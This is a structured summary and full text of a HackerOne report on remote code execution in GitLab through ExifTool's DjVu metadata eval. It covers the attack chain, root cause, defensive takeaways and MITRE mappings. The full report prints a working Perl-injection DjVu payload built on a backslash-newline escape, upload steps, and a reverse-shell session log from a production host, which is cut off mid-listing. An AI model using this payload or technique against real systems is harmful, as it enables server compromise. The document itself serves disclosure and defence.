# RCE via ExifTool DjVu Metadata Eval - GitLab

## Metadata
- **Source:** HackerOne
- **Report:** 1154542 | https://hackerone.com/reports/1154542
- **Submitted:** 2021-04-07
- **Reporter:** vakzz
- **Program:** GitLab
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Remote Code Execution, Arbitrary Code Execution, Unsafe Deserialization, File Type Confusion, Command Injection
- **CVEs:** None
- **Category:** memory-binary

## Summary
GitLab Workhorse processes uploaded images through ExifTool to remove non-whitelisted EXIF tags. An attacker can bypass file extension validation by uploading a DjVu file with a .jpg extension, triggering ExifTool's DjVu parser which unsafely evals metadata tokens using Perl's eval(), allowing arbitrary code execution. The vulnerability stems from improper escape sequence validation that allows backslash-newline sequences to break out of quoted strings.

## Attack scenario
1. Attacker crafts a malicious DjVu file containing Perl code in the annotation metadata section
2. The payload uses backslash-newline sequences to escape quote boundaries and inject arbitrary Perl expressions
3. Attacker renames the DjVu file with a .jpg extension to bypass filename-based validation
4. Attacker uploads the malicious file to GitLab via snippet creation or other file upload functionality
5. GitLab Workhorse passes the file to ExifTool, which ignores the .jpg extension and identifies it as DjVu based on file magic bytes
6. ExifTool's DjVu parser evaluates the malicious metadata tokens using eval(), executing the attacker's Perl code with git user privileges

## Root cause
Multiple layered failures: (1) ExifTool determines file type by content magic bytes, not extension, bypassing extension-based validation; (2) DjVu.pm module uses Perl eval() on user-controlled metadata tokens without proper sanitization; (3) Escape sequence validation is incomplete, failing to handle backslash-newline pairs that allow quote closure and arbitrary expression injection

## Attacker mindset
Sophisticated threat actor who understands ExifTool's multi-format support, Perl eval semantics, and escape sequence handling. The use of backslash-newline bypass demonstrates knowledge of parser quirks and escape sequence processing edge cases. Escalated to reverse shell payload, indicating intent for persistent access.

## Defensive takeaways
- Disable or sandbox untrusted language eval() functions (Perl eval, Python eval, etc.) when processing user-supplied data
- Validate file types using reliable magic byte detection before filename-based checks, but also apply strict whitelisting to disable parsing of unexpected formats
- Use security-focused alternatives to ExifTool or run it in a heavily sandboxed/containerized environment with minimal privileges
- Implement comprehensive input validation and sanitization for all metadata fields, including escape sequences and multi-byte sequences
- Apply strict allowlists for ExifTool tags and formats rather than blocklists; explicitly disable all parsers except those required (e.g., disable DjVu parser if not needed)
- Run file processing services with minimal privileges (already partially done with git user, but further isolation recommended)
- Regularly audit dependencies for unsafe eval/parsing patterns and prioritize patching upstream vulnerabilities
- Implement defense-in-depth with multiple validation layers rather than relying on single points of control

## Variant hunting
Search for similar patterns in other projects using ExifTool, ImageMagick, GhostScript, or other tools that auto-detect file types. Look for unsafe eval in metadata parsers (PDF XFA templates, SVG handlers, OpenOffice macros). Investigate other ExifTool parsers (XMP, IPTC, ID3) for eval vulnerabilities. Check for similar escape sequence bypasses in quote handling across image/document processors.

## MITRE ATT&CK
- T1190
- T1059
- T1203
- T1566.002
- T1204.002
- T1105
- T1190

## Notes
Report demonstrates successful exploitation with reverse shell on production GitLab instance (web-09-sv-gprd). The vulnerability chain is elegant: content-based detection + unsafe eval + incomplete validation = full RCE. The backslash-newline escape sequence bypass is a critical detail showing how seemingly validated escape handling can be circumvented. Workhorse extension list (jpg|jpeg|tiff) provided false sense of security due to content-based type detection override.

## Full report
<details><summary>Expand</summary>

### Summary
When uploading image files, GitLab Workhorse passes any files with the extensions [jpg|jpeg|tiff](https://gitlab.com/gitlab-org/gitlab/-/blob/v13.10.2-ee/workhorse/internal/upload/exif/exif.go#L104) through to [ExifTool](https://exiftool.org/) to remove any non-whitelisted tags.

An issue with this is that ExifTool will ignore the file extension and try to determine what the file is based on the content, allowing for any of the supported parsers to be hit instead of just JPEG and TIFF by just renaming the uploaded file.

One of the supported formats is [DjVu](https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm). When parsing the DjVu annotation, the [tokens are evaled](https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm#L233) to "convert C escape sequences". 

There is some validation to try and ensure that everything is properly escaped, but a backslash followed by a newline is correctly handled allowing the quotes to be closed and arbitrary perl inserted and evaluated:

```
(metadata
	(Copyright "\
" . qx{echo vakzz >/tmp/vakzz} . \
" b ") )
```

{F1257008} is an example DjVu file with the above metadata, and {F1257009} is an example that runs a reverse shell.

### Steps to reproduce
1. Download {F1257008} and unzip it
1. Create a new snippet
1. In the description field, hit "Attach a file"
1. Select and uplaod `echo_vakzz.jpg`
1. See that the file `/tmp/vakzz` has been created on the server


Uploading {F1257009} to https://gitlab.com/-/snippets/new resulted in a shell on `web-09-sv-gprd`:

```
Connection from [34.74.90.73] port 12345 [tcp/*] accepted (family 2, sport 17073)
id
uid=500(git) gid=500(git) groups=500(git)
hostname -a
web-09-sv-gprd
ps auxww
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0 185524  5496 ?        Ss    2020  28:31 /sbin/init
root         2  0.0  0.0      0     0 ?        S     2020   1:44 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<    2020   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S     2020  22:50 [ksoftirqd/0]
root         8  0.1  0.0      0     0 ?        I     2020 552:25 [rcu_sched]
root         9  0.0  0.0      0     0 ?        I     2020   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S     2020   1:05 [migration/0]
root        11  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/1]
root        14  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/1]
root        15  0.0  0.0      0     0 ?        S     2020   1:03 [migration/1]
root        16  0.0  0.0      0     0 ?        S     2020  20:27 [ksoftirqd/1]
root        18  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/1:0H]
root        19  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/2]
root        20  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/2]
root        21  0.0  0.0      0     0 ?        S     2020   1:04 [migration/2]
root        22  0.0  0.0      0     0 ?        S     2020  18:14 [ksoftirqd/2]
root        24  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/2:0H]
root        25  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/3]
root        26  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/3]
root        27  0.0  0.0      0     0 ?        S     2020   1:05 [migration/3]
root        28  0.0  0.0      0     0 ?        S     2020  17:57 [ksoftirqd/3]
root        30  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/3:0H]
root        31  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/4]
root        32  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/4]
root        33  0.0  0.0      0     0 ?        S     2020   1:05 [migration/4]
root        34  0.0  0.0      0     0 ?        S     2020  17:09 [ksoftirqd/4]
root        36  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/4:0H]
root        37  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/5]
root        38  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/5]
root        39  0.0  0.0      0     0 ?        S     2020   1:05 [migration/5]
root        40  0.0  0.0      0     0 ?        S     2020  16:56 [ksoftirqd/5]
root        42  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/5:0H]
root        43  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/6]
root        44  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/6]
root        45  0.0  0.0      0     0 ?        S     2020   1:05 [migration/6]
root        46  0.0  0.0      0     0 ?        S     2020  16:33 [ksoftirqd/6]
root        48  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/6:0H]
root        49  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/7]
root        50  0.0  0.0      0     0 ?        S     2020   1:06 [watchdog/7]
root        51  0.0  0.0      0     0 ?        S     2020   1:05 [migration/7]
root        52  0.0  0.0      0     0 ?        S     2020  16:25 [ksoftirqd/7]
root        54  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/7:0H]
root        55  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/8]
root        56  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/8]
root        57  0.0  0.0      0     0 ?        S     2020   1:06 [migration/8]
root        58  0.0  0.0      0     0 ?        S     2020  16:22 [ksoftirqd/8]
root        60  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/8:0H]
root        61  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/9]
root        62  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/9]
root        63  0.0  0.0      0     0 ?        S     2020   1:05 [migration/9]
root        64  0.0  0.0      0     0 ?        S     2020  15:52 [ksoftirqd/9]
root        66  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/9:0H]
root        67  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/10]
root        68  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/10]
root        69  0.0  0.0      0     0 ?        S     2020   1:06 [migration/10]
root        70  0.0  0.0      0     0 ?        S     2020  16:10 [ksoftirqd/10]
root        72  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/10:0H]
root        73  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/11]
root        74  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/11]
root        75  0.0  0.0      0     0 ?        S     2020   1:06 [migration/11]
root        76  0.0  0.0      0     0 ?        S     2020  16:08 [ksoftirqd/11]
root        78  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/11:0H]
root        79  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/12]
root        80  0.0  0.0      0     0 ?        S     2020   1:09 [watchdog/12]
root        81  0.0  0.0      0     0 ?        S     2020   1:03 [migration/12]
root        82  0.0  0.0      0     0 ?        S     2020  17:07 [ksoftirqd/12]
root        84  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/12:0H]
root        85  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/13]
root        86  0.0  0.0      0     0 ?        S     2020   1:06 [watchdog/13]
root        87  0.0  0.0      0     0 ?        S     2020   1:06 [migration/13]
root        88  0.0  0.0      0     0 ?        S     2020  16:45 [ksoftirqd/13]
root        90  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/13:0H]
root        91  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/14]
root        92  0.0  0.0      0     0 ?        S     2020   1:04 [watchdog/14]
root        93  0.0  0.0      0     0 ?        S     2020   1:05 [migration/14]
root        94  0.0  0.0      0     0 ?        S     2020  16:27 [ksoft

</details>

---
*Analysed by Claude on 2026-05-11*
